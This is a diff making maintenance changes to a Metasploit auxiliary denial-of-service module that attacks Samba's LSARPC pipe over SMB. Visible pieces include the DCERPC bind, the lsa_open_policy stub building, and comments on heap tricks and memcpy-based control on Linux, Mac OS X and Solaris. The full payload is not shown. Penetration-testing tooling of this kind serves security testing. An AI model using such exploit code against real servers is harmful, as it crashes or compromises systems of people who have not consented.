@@ -1,14 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::DCERPC
   include Msf::Exploit::Remote::SMB::Client
   include Msf::Auxiliary::Dos
@@ -32,7 +27,7 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         OptString.new('SMBPIPE', [ true,  "The pipe name to use", 'LSARPC']),
-      ], self.class)
+      ])
 
   end
 
@@ -51,9 +46,9 @@ class Metasploit3 < Msf::Auxiliary
     dcerpc_bind(handle)
     print_status("Bound to #{handle} ...")
 
-    #    Linux: Needs heap magic to work around glibc (or TALLOC mode for 3.0.20+)
+    # Linux: Needs heap magic to work around glibc (or TALLOC mode for 3.0.20+)
     # Mac OS X: PC control via memcpy to stack ptr
-    #  Solaris: PC control via memcpy to stack ptr
+    # Solaris: PC control via memcpy to stack ptr
 
     stub = lsa_open_policy(dcerpc)
     stub << NDR.long(1)
@@ -78,5 +73,4 @@ class Metasploit3 < Msf::Auxiliary
 
     disconnect
   end
-
 end
